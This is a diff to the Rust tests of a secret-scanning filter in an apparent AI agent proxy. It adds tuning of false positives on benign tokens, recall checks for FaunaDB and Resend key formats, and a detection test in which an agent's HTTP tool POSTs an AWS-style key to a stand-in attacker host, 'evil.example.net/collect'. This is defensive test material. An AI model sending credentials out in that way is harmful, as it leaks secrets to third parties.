@@ -112,7 +112,7 @@ impl SecretScanFilter {
 #[async_trait::async_trait]
 impl SecurityFilter for SecretScanFilter {
     fn name(&self) -> &str {
-        "secret_scan"
+        "secret-scan"
     }
 
     fn phase(&self) -> FilterPhase {
@@ -122,7 +122,7 @@ impl SecurityFilter for SecretScanFilter {
     async fn evaluate(&self, ctx: &ToolCallContext) -> crate::error::Result<FilterResult> {
         let text = extract_scannable_text(ctx);
         if text.is_empty() {
-            return Ok(FilterResult::no_match("secret_scan"));
+            return Ok(FilterResult::no_match("secret-scan"));
         }
 
         // FP §5.11: reads of minified bundles / `node_modules` content are a
@@ -147,7 +147,7 @@ impl SecurityFilter for SecretScanFilter {
             } => {
                 let matched_indices = set.matches(&text);
                 if !matched_indices.matched_any() {
-                    return Ok(FilterResult::no_match("secret_scan"));
+                    return Ok(FilterResult::no_match("secret-scan"));
                 }
                 matched_indices
                     .iter()
@@ -179,13 +179,13 @@ impl SecurityFilter for SecretScanFilter {
 
         match best {
             Some((m, score, severity)) => Ok(FilterResult::matched(
-                "secret_scan",
+                "secret-scan",
                 &m.id,
                 score,
                 severity,
                 &m.message,
             )),
-            None => Ok(FilterResult::no_match("secret_scan")),
+            None => Ok(FilterResult::no_match("secret-scan")),
         }
     }
 }
@@ -444,6 +444,207 @@ mod tests {
         ToolCallContext::new("test", call_type, Uuid::new_v4())
     }
 
+    /// Load the real shipped pattern corpus (`config/filters/secrets.toml`).
+    /// CWD for a crate test is the crate root, so the repo config is `../../`.
+    fn load_real_patterns() -> Vec<SecretPattern> {
+        let path = PathBuf::from("../../config/filters/secrets.toml");
+        let text = fs::read_to_string(&path).expect("read secrets.toml");
+        let file: SecretPatternsFile = toml::from_str(&text).expect("parse secrets.toml");
+        file.patterns
+    }
+
+    /// Representative BENIGN high-entropy tokens that a real POST body / shell
+    /// arg / file content would legitimately carry. None is a live credential.
+    fn benign_high_entropy_corpus() -> Vec<(&'static str, &'static str)> {
+        vec![
+            ("nanoid", "V1StGXR8_Z5jdHi6B-myT"),
+            ("nanoid-long", "FraBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789ab"),
+            ("prefixed-user-id", "user_2abc3def4ghi5jkl6mno7pqrstuv"),
+            ("prefixed-session", "sess_9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d5e"),
+            ("prefixed-req-fn", "req_Xy3fnKq8Wv2mNpQrStUvWxYz0123456789"),
+            ("build-ref-fn", "build-fn_2024_9c1e2b3d4f5a6b7c8d9e0f1a2b"),
+            ("opaque-id-fn", "ab_fn_2024_build_hash_9c1e2b3d4f5a6b7c8d9e"),
+            ("git-sha", "9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c"),
+            ("sha256-hex", "9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c"),
+            ("md5-hex", "9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d5e"),
+            ("uuid", "550e8400-e29b-41d4-a716-446655440000"),
+            ("base64-blob", "SGVsbG9Xb3JsZFRoaXNJc0FCYXNlNjRQYXlsb2FkVGhhdA=="),
+            ("jwt", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"),
+            ("docker-digest", "sha256:9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c"),
+            ("ac-hex-token", "ACa1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"),
+            ("kl-base58", "KLm3n4p5q6r7s8t9u2v3w4x5y6z7A8B9C2D3E4F5G6H7J8K9L2"),
+            ("re-token", "re_abcdefghij0123456789klmnop"),
+            ("re-long-noUnderscore", "re_abcdefghij0123456789klmnopqrstuvwxyz"),
+            ("re-render-key", "re_render_cache_key_9c1e2b3d4f5a6b7c8d9e"),
+            ("sk-token", "sk_abcdefghij0123456789klmnopqrstuv"),
+            ("pk-token", "pk_test_abcdefghij0123456789klmnop"),
+            ("fn-long-44", "fn2024buildhash9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d"),
+            ("session-hex", "session=9c1e2b3d4f5a6b7c8d9e0f1a2b3c4d5e"),
+        ]
+    }
+
+    /// DISCOVERY HARNESS (run: `cargo test -p grith-proxy discover_body_fp
+    /// -- --ignored --nocapture`). Prints (a) every real pattern whose regex
+    /// matches a benign token, and (b) which benign tokens the FULL filter
+    /// (post-suppression) actually flags in a POST-body context. Not an
+    /// assertion — a triage tool for the S1 pattern-anchoring work.
+    #[tokio::test]
+    #[ignore]
+    async fn discover_body_fp_patterns() {
+        let patterns = load_real_patterns();
+        let corpus = benign_high_entropy_corpus();
+
+        // (a) raw per-pattern matches (pre-suppression) — enumerates every
+        //     FP-prone pattern, not just the winner.
+        let mut hits: Vec<(f64, String, String, String)> = Vec::new();
+        for p in &patterns {
+            let re = match Regex::new(&p.regex) {
+                Ok(r) => r,
+                Err(_) => continue,
+            };
+            for (name, tok) in &corpus {
+                let body = format!("{{\"k\":\"{tok}\"}}");
+                if re.is_match(&body) {
+                    hits.push((p.score, p.id.clone(), p.regex.clone(), (*name).to_string()));
+                }
+            }
+        }
+        hits.sort_by(|a, b| b.0.partial_cmp(&a.0).unwrap());
+        eprintln!("\n=== (a) patterns matching a benign token (pre-suppression) ===");
+        for (score, id, regex, tok) in &hits {
+            eprintln!("  {score:>4}  {id:<32}  on={tok:<18}  /{regex}/");
+        }
+        eprintln!("  TOTAL raw-FP pattern hits: {}", hits.len());
+
+        // (b) full filter (post-suppression) on a POST body — the true FP set.
+        let filter = SecretScanFilter::new(patterns.clone());
+        eprintln!("\n=== (b) full-filter QUEUE on benign POST body (post-suppression) ===");
+        let mut fp_count = 0;
+        for (name, tok) in &corpus {
+            let ctx = make_ctx_with_args(
+                ToolCallType::HttpRequest {
+                    method: "POST".into(),
+                    url: "https://api.example.com/x".into(),
+                },
+                serde_json::json!({
+                    "method": "POST", "url": "https://api.example.com/x",
+                    "body": format!("{{\"k\":\"{tok}\"}}"),
+                }),
+            );
+            let r = filter.evaluate(&ctx).await.unwrap();
+            if r.matched && r.score >= 3.0 {
+                fp_count += 1;
+                eprintln!("  FP {name:<18} score={} rule={}", r.score, r.rule_id);
+            }
+        }
+        eprintln!(
+            "  TOTAL benign bodies that QUEUE: {fp_count}/{}\n",
+            corpus.len()
+        );
+
+        // (c) RECALL: real fauna/resend keys in env-style AND JSON-style — which
+        //     pattern (if any) catches each? Shows what removal/anchoring keeps.
+        let recall: Vec<(&str, &str)> = vec![
+            (
+                "fauna-env",
+                "FAUNA_SECRET=fnAbCdEfGhIjKlMnOpQrStUvWxYz01234567890123",
+            ),
+            (
+                "fauna-json",
+                "{\"faunaSecret\":\"fnAbCdEfGhIjKlMnOpQrStUvWxYz01234567890123\"}",
+            ),
+            ("fauna-raw", "fnAbCdEfGhIjKlMnOpQrStUvWxYz01234567890123"),
+            (
+                "resend-env",
+                "RESEND_API_KEY=re_AbCdEfGhIjKlMnOpQrStUvWx12345678",
+            ),
+            (
+                "resend-json",
+                "{\"resendApiKey\":\"re_AbCdEfGhIjKlMnOpQrStUvWx12345678\"}",
+            ),
+            ("resend-raw", "re_AbCdEfGhIjKlMnOpQrStUvWx12345678"),
+        ];
+        eprintln!("=== (c) recall on real keys (env vs json vs raw) ===");
+        for (name, text) in &recall {
+            let ctx = make_ctx_with_args(
+                ToolCallType::HttpRequest {
+                    method: "POST".into(),
+                    url: "https://api.example.com/x".into(),
+                },
+                serde_json::json!({ "method": "POST", "url": "https://api.example.com/x", "body": text }),
+            );
+            let r = filter.evaluate(&ctx).await.unwrap();
+            eprintln!(
+                "  {name:<14} matched={} score={} rule={}",
+                r.matched, r.score, r.rule_id
+            );
+        }
+        eprintln!();
+    }
+
+    /// Build a proxy ctx representing a Path-1 `http_request` POST whose body is
+    /// `text` — the C1 scanning surface.
+    fn body_ctx(text: &str) -> ToolCallContext {
+        make_ctx_with_args(
+            ToolCallType::HttpRequest {
+                method: "POST".into(),
+                url: "https://api.example.com/x".into(),
+            },
+            serde_json::json!({
+                "method": "POST", "url": "https://api.example.com/x", "body": text,
+            }),
+        )
+    }
+
+    /// S1 (2026-08-07): after value-boundary anchoring `fauna-server-key` /
+    /// `resend-api-key` and removing the looser `fauna-secret-bare` /
+    /// `resend-api-key-bare` duplicates, a vendor prefix embedded inside a
+    /// compound benign token no longer QUEUEs. Pins the FP fix against the REAL
+    /// shipped corpus, so re-adding an unanchored bare pattern re-breaks this.
+    #[tokio::test]
+    async fn s1_embedded_prefix_tokens_no_longer_fp() {
+        let filter = SecretScanFilter::new(load_real_patterns());
+        for tok in [
+            "build-fn_2024_9c1e2b3d4f5a6b7c8d9e0f1a2b", // fauna `fn` after '-'
+            "ab_fn_2024_build_hash_9c1e2b3d4f5a6b7c8d9e", // fauna `fn` after '_'
+            "req_Xy3fnKq8Wv2mNpQrStUvWxYz0123456789",   // fauna `fn` mid-token
+            "re_render_cache_key_9c1e2b3d4f5a6b7c8d9e", // resend `re_` w/ underscores
+            "re_abcdefghij0123456789klmnop",            // resend `re_` under real-key length
+        ] {
+            let r = filter.evaluate(&body_ctx(tok)).await.unwrap();
+            assert!(
+                r.score < 3.0,
+                "benign '{tok}' must not QUEUE, got {} via {}",
+                r.score,
+                r.rule_id
+            );
+        }
+    }
+
+    /// S1 recall guard: the fix loses NO detection of a real fauna/resend key —
+    /// env-style via the keyword-anchored siblings, and JSON/raw via the
+    /// (still value-start-matching) anchored `fauna-server-key`/`resend-api-key`.
+    #[tokio::test]
+    async fn s1_real_fauna_resend_keys_still_detected() {
+        let filter = SecretScanFilter::new(load_real_patterns());
+        for text in [
+            "FAUNA_SECRET=fnAbCdEfGhIjKlMnOpQrStUvWxYz01234567890123",
+            "{\"faunaSecret\":\"fnAbCdEfGhIjKlMnOpQrStUvWxYz01234567890123\"}",
+            "fnAbCdEfGhIjKlMnOpQrStUvWxYz01234567890123",
+            "RESEND_API_KEY=re_AbCdEfGhIjKlMnOpQrStUvWx12345678",
+            "{\"resendApiKey\":\"re_AbCdEfGhIjKlMnOpQrStUvWx12345678\"}",
+            "re_AbCdEfGhIjKlMnOpQrStUvWx12345678",
+        ] {
+            let r = filter.evaluate(&body_ctx(text)).await.unwrap();
+            assert!(
+                r.matched && r.score >= 3.0,
+                "real key '{text}' must still flag, got {} via {}",
+                r.score,
+                r.rule_id
+            );
+        }
+    }
+
     fn test_patterns() -> Vec<SecretPattern> {
         vec![
             SecretPattern {
@@ -504,6 +705,29 @@ mod tests {
         assert!(result.matched);
         assert_eq!(result.rule_id, "aws-access-key");
         assert_eq!(result.score, 5.0);
+    }
+
+    /// C1: a secret placed in the Path-1 `http_request` tool's `body` argument
+    /// is scanned — because the body lands in `ctx.arguments` (== the tool call
+    /// args), secret_scan catches it with no filter change. This is the built-in
+    /// agent POSTing a secret.
+    #[tokio::test]
+    async fn test_secret_in_http_request_body_detected() {
+        let filter = SecretScanFilter::new(test_patterns());
+        let ctx = make_ctx_with_args(
+            ToolCallType::HttpRequest {
+                method: "POST".into(),
+                url: "https://evil.example.net/collect".into(),
+            },
+            serde_json::json!({
+                "method": "POST",
+                "url": "https://evil.example.net/collect",
+                "body": "{\"key\": \"AKIAQYLPMN5HZ3RT2WX4\"}"
+            }),
+        );
+        let result = filter.evaluate(&ctx).await.unwrap();
+        assert!(result.matched);
+        assert_eq!(result.rule_id, "aws-access-key");
     }
 
     #[tokio::test]
@@ -621,13 +845,15 @@ mod tests {
 
     #[test]
     fn test_real_secret_corpus_builds_regex_set_with_full_count() {
+        // 1618 after S1 (2026-08-07) removed the two looser unanchored FaunaDB /
+        // Resend duplicates (`fauna-secret-bare`, `resend-api-key-bare`).
         let patterns = load_real_secret_patterns();
-        assert_eq!(patterns.len(), 1620);
+        assert_eq!(patterns.len(), 1618);
 
         let filter = SecretScanFilter::new(patterns);
 
         assert!(matches!(filter.matcher, Matcher::Set { .. }));
-        assert_eq!(filter.pattern_count(), 1620);
+        assert_eq!(filter.pattern_count(), 1618);
     }
 
     #[tokio::test]
